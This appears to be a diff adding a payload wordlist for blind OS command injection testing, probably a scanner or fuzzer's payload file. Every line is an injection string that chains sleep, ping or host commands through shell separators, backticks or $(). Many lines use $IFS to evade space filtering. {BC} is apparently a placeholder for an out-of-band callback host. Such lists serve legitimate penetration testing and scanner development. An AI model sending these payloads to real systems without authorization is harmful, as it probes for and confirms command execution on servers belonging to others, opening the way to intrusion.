@@ -1,0 +1,342 @@
+sleep 11
+sleep$IFS11
+ping -c 11 {BC}
+ping$IFS-c$IFS11$IFS{BC}
+host {BC}
+host$IFS{BC}
+`sleep 11`
+`sleep$IFS11`
+`ping -c 11 {BC}`
+`ping$IFS-c$IFS11$IFS{BC}`
+`host {BC}`
+`host$IFS{BC}`
+$(sleep 11)
+$(sleep$IFS11)
+$(ping -c 11 {BC})
+$(ping$IFS-c$IFS11$IFS{BC})
+$(host {BC})
+$(host$IFS{BC})
+&&sleep 11
+&&sleep$IFS11
+&&ping -c 11 {BC}
+&&ping$IFS-c$IFS11$IFS{BC}
+&&host {BC}
+&&host$IFS{BC}
+||sleep 11
+||sleep$IFS11
+||ping -c 11 {BC}
+||ping$IFS-c$IFS11$IFS{BC}
+||host {BC}
+||host$IFS{BC}
+;sleep 11
+;sleep$IFS11
+;ping -c 11 {BC}
+;ping$IFS-c$IFS11$IFS{BC}
+;host {BC}
+;host$IFS{BC}
+|sleep 11
+|sleep$IFS11
+|ping -c 11 {BC}
+|ping$IFS-c$IFS11$IFS{BC}
+|host {BC}
+|host$IFS{BC}
+&&sleep 11&&
+&&sleep$IFS11&&
+&&ping -c 11 {BC}&&
+&&ping$IFS-c$IFS11$IFS{BC}&&
+&&host {BC}&&
+&&host$IFS{BC}&&
+||sleep 11||
+||sleep$IFS11||
+||ping -c 11 {BC}||
+||ping$IFS-c$IFS11$IFS{BC}||
+||host {BC}||
+||host$IFS{BC}||
+;sleep 11;
+;sleep$IFS11;
+;ping -c 11 {BC};
+;ping$IFS-c$IFS11$IFS{BC};
+;host {BC};
+;host$IFS{BC};
+|sleep 11|
+|sleep$IFS11|
+|ping -c 11 {BC}|
+|ping$IFS-c$IFS11$IFS{BC}|
+|host {BC}|
+|host$IFS{BC}|
+&&sleep 11&&echo 
+&&sleep 11&&echo$IFS
+&&sleep$IFS11&&echo 
+&&sleep$IFS11&&echo$IFS
+&&ping -c 11 {BC}&&echo 
+&&ping -c 11 {BC}&&echo$IFS
+&&ping$IFS-c$IFS11$IFS{BC}&&echo 
+&&ping$IFS-c$IFS11$IFS{BC}&&echo$IFS
+&&host {BC}&&echo 
+&&host {BC}&&echo$IFS
+&&host$IFS{BC}&&echo 
+&&host$IFS{BC}&&echo$IFS
+||sleep 11||echo 
+||sleep 11||echo$IFS
+||sleep$IFS11||echo 
+||sleep$IFS11||echo$IFS
+||ping -c 11 {BC}||echo 
+||ping -c 11 {BC}||echo$IFS
+||ping$IFS-c$IFS11$IFS{BC}||echo 
+||ping$IFS-c$IFS11$IFS{BC}||echo$IFS
+||host {BC}||echo 
+||host {BC}||echo$IFS
+||host$IFS{BC}||echo 
+||host$IFS{BC}||echo$IFS
+;sleep 11;echo 
+;sleep 11;echo$IFS
+;sleep$IFS11;echo 
+;sleep$IFS11;echo$IFS
+;ping -c 11 {BC};echo 
+;ping -c 11 {BC};echo$IFS
+;ping$IFS-c$IFS11$IFS{BC};echo 
+;ping$IFS-c$IFS11$IFS{BC};echo$IFS
+;host {BC};echo 
+;host {BC};echo$IFS
+;host$IFS{BC};echo 
+;host$IFS{BC};echo$IFS
+|sleep 11|echo 
+|sleep 11|echo$IFS
+|sleep$IFS11|echo 
+|sleep$IFS11|echo$IFS
+|ping -c 11 {BC}|echo 
+|ping -c 11 {BC}|echo$IFS
+|ping$IFS-c$IFS11$IFS{BC}|echo 
+|ping$IFS-c$IFS11$IFS{BC}|echo$IFS
+|host {BC}|echo 
+|host {BC}|echo$IFS
+|host$IFS{BC}|echo 
+|host$IFS{BC}|echo$IFS
+'sleep 11'
+'sleep$IFS11'
+'ping -c 11 {BC}'
+'ping$IFS-c$IFS11$IFS{BC}'
+'host {BC}'
+'host$IFS{BC}'
+'`sleep 11`'
+'`sleep$IFS11`'
+'`ping -c 11 {BC}`'
+'`ping$IFS-c$IFS11$IFS{BC}`'
+'`host {BC}`'
+'`host$IFS{BC}`'
+'$(sleep 11)'
+'$(sleep$IFS11)'
+'$(ping -c 11 {BC})'
+'$(ping$IFS-c$IFS11$IFS{BC})'
+'$(host {BC})'
+'$(host$IFS{BC})'
+'&&sleep 11'
+'&&sleep$IFS11'
+'&&ping -c 11 {BC}'
+'&&ping$IFS-c$IFS11$IFS{BC}'
+'&&host {BC}'
+'&&host$IFS{BC}'
+'||sleep 11'
+'||sleep$IFS11'
+'||ping -c 11 {BC}'
+'||ping$IFS-c$IFS11$IFS{BC}'
+'||host {BC}'
+'||host$IFS{BC}'
+';sleep 11'
+';sleep$IFS11'
+';ping -c 11 {BC}'
+';ping$IFS-c$IFS11$IFS{BC}'
+';host {BC}'
+';host$IFS{BC}'
+'|sleep 11'
+'|sleep$IFS11'
+'|ping -c 11 {BC}'
+'|ping$IFS-c$IFS11$IFS{BC}'
+'|host {BC}'
+'|host$IFS{BC}'
+'&&sleep 11&&'
+'&&sleep$IFS11&&'
+'&&ping -c 11 {BC}&&'
+'&&ping$IFS-c$IFS11$IFS{BC}&&'
+'&&host {BC}&&'
+'&&host$IFS{BC}&&'
+'||sleep 11||'
+'||sleep$IFS11||'
+'||ping -c 11 {BC}||'
+'||ping$IFS-c$IFS11$IFS{BC}||'
+'||host {BC}||'
+'||host$IFS{BC}||'
+';sleep 11;'
+';sleep$IFS11;'
+';ping -c 11 {BC};'
+';ping$IFS-c$IFS11$IFS{BC};'
+';host {BC};'
+';host$IFS{BC};'
+'|sleep 11|'
+'|sleep$IFS11|'
+'|ping -c 11 {BC}|'
+'|ping$IFS-c$IFS11$IFS{BC}|'
+'|host {BC}|'
+'|host$IFS{BC}|'
+'&&sleep 11&&echo '
+'&&sleep 11&&echo$IFS'
+'&&sleep$IFS11&&echo '
+'&&sleep$IFS11&&echo$IFS'
+'&&ping -c 11 {BC}&&echo '
+'&&ping -c 11 {BC}&&echo$IFS'
+'&&ping$IFS-c$IFS11$IFS{BC}&&echo '
+'&&ping$IFS-c$IFS11$IFS{BC}&&echo$IFS'
+'&&host {BC}&&echo '
+'&&host {BC}&&echo$IFS'
+'&&host$IFS{BC}&&echo '
+'&&host$IFS{BC}&&echo$IFS'
+'||sleep 11||echo '
+'||sleep 11||echo$IFS'
+'||sleep$IFS11||echo '
+'||sleep$IFS11||echo$IFS'
+'||ping -c 11 {BC}||echo '
+'||ping -c 11 {BC}||echo$IFS'
+'||ping$IFS-c$IFS11$IFS{BC}||echo '
+'||ping$IFS-c$IFS11$IFS{BC}||echo$IFS'
+'||host {BC}||echo '
+'||host {BC}||echo$IFS'
+'||host$IFS{BC}||echo '
+'||host$IFS{BC}||echo$IFS'
+';sleep 11;echo '
+';sleep 11;echo$IFS'
+';sleep$IFS11;echo '
+';sleep$IFS11;echo$IFS'
+';ping -c 11 {BC};echo '
+';ping -c 11 {BC};echo$IFS'
+';ping$IFS-c$IFS11$IFS{BC};echo '
+';ping$IFS-c$IFS11$IFS{BC};echo$IFS'
+';host {BC};echo '
+';host {BC};echo$IFS'
+';host$IFS{BC};echo '
+';host$IFS{BC};echo$IFS'
+'|sleep 11|echo '
+'|sleep 11|echo$IFS'
+'|sleep$IFS11|echo '
+'|sleep$IFS11|echo$IFS'
+'|ping -c 11 {BC}|echo '
+'|ping -c 11 {BC}|echo$IFS'
+'|ping$IFS-c$IFS11$IFS{BC}|echo '
+'|ping$IFS-c$IFS11$IFS{BC}|echo$IFS'
+'|host {BC}|echo '
+'|host {BC}|echo$IFS'
+'|host$IFS{BC}|echo '
+'|host$IFS{BC}|echo$IFS'
+"sleep 11"
+"sleep$IFS11"
+"ping -c 11 {BC}"
+"ping$IFS-c$IFS11$IFS{BC}"
+"host {BC}"
+"host$IFS{BC}"
+"`sleep 11`"
+"`sleep$IFS11`"
+"`ping -c 11 {BC}`"
+"`ping$IFS-c$IFS11$IFS{BC}`"
+"`host {BC}`"
+"`host$IFS{BC}`"
+"$(sleep 11)"
+"$(sleep$IFS11)"
+"$(ping -c 11 {BC})"
+"$(ping$IFS-c$IFS11$IFS{BC})"
+"$(host {BC})"
+"$(host$IFS{BC})"
+"&&sleep 11"
+"&&sleep$IFS11"
+"&&ping -c 11 {BC}"
+"&&ping$IFS-c$IFS11$IFS{BC}"
+"&&host {BC}"
+"&&host$IFS{BC}"
+"||sleep 11"
+"||sleep$IFS11"
+"||ping -c 11 {BC}"
+"||ping$IFS-c$IFS11$IFS{BC}"
+"||host {BC}"
+"||host$IFS{BC}"
+";sleep 11"
+";sleep$IFS11"
+";ping -c 11 {BC}"
+";ping$IFS-c$IFS11$IFS{BC}"
+";host {BC}"
+";host$IFS{BC}"
+"|sleep 11"
+"|sleep$IFS11"
+"|ping -c 11 {BC}"
+"|ping$IFS-c$IFS11$IFS{BC}"
+"|host {BC}"
+"|host$IFS{BC}"
+"&&sleep 11&&"
+"&&sleep$IFS11&&"
+"&&ping -c 11 {BC}&&"
+"&&ping$IFS-c$IFS11$IFS{BC}&&"
+"&&host {BC}&&"
+"&&host$IFS{BC}&&"
+"||sleep 11||"
+"||sleep$IFS11||"
+"||ping -c 11 {BC}||"
+"||ping$IFS-c$IFS11$IFS{BC}||"
+"||host {BC}||"
+"||host$IFS{BC}||"
+";sleep 11;"
+";sleep$IFS11;"
+";ping -c 11 {BC};"
+";ping$IFS-c$IFS11$IFS{BC};"
+";host {BC};"
+";host$IFS{BC};"
+"|sleep 11|"
+"|sleep$IFS11|"
+"|ping -c 11 {BC}|"
+"|ping$IFS-c$IFS11$IFS{BC}|"
+"|host {BC}|"
+"|host$IFS{BC}|"
+"&&sleep 11&&echo "
+"&&sleep 11&&echo$IFS"
+"&&sleep$IFS11&&echo "
+"&&sleep$IFS11&&echo$IFS"
+"&&ping -c 11 {BC}&&echo "
+"&&ping -c 11 {BC}&&echo$IFS"
+"&&ping$IFS-c$IFS11$IFS{BC}&&echo "
+"&&ping$IFS-c$IFS11$IFS{BC}&&echo$IFS"
+"&&host {BC}&&echo "
+"&&host {BC}&&echo$IFS"
+"&&host$IFS{BC}&&echo "
+"&&host$IFS{BC}&&echo$IFS"
+"||sleep 11||echo "
+"||sleep 11||echo$IFS"
+"||sleep$IFS11||echo "
+"||sleep$IFS11||echo$IFS"
+"||ping -c 11 {BC}||echo "
+"||ping -c 11 {BC}||echo$IFS"
+"||ping$IFS-c$IFS11$IFS{BC}||echo "
+"||ping$IFS-c$IFS11$IFS{BC}||echo$IFS"
+"||host {BC}||echo "
+"||host {BC}||echo$IFS"
+"||host$IFS{BC}||echo "
+"||host$IFS{BC}||echo$IFS"
+";sleep 11;echo "
+";sleep 11;echo$IFS"
+";sleep$IFS11;echo "
+";sleep$IFS11;echo$IFS"
+";ping -c 11 {BC};echo "
+";ping -c 11 {BC};echo$IFS"
+";ping$IFS-c$IFS11$IFS{BC};echo "
+";ping$IFS-c$IFS11$IFS{BC};echo$IFS"
+";host {BC};echo "
+";host {BC};echo$IFS"
+";host$IFS{BC};echo "
+";host$IFS{BC};echo$IFS"
+"|sleep 11|echo "
+"|sleep 11|echo$IFS"
+"|sleep$IFS11|echo "
+"|sleep$IFS11|echo$IFS"
+"|ping -c 11 {BC}|echo "
+"|ping -c 11 {BC}|echo$IFS"
+"|ping$IFS-c$IFS11$IFS{BC}|echo "
+"|ping$IFS-c$IFS11$IFS{BC}|echo$IFS"
+"|host {BC}|echo "
+"|host {BC}|echo$IFS"
+"|host$IFS{BC}|echo "
+"|host$IFS{BC}|echo$IFS"
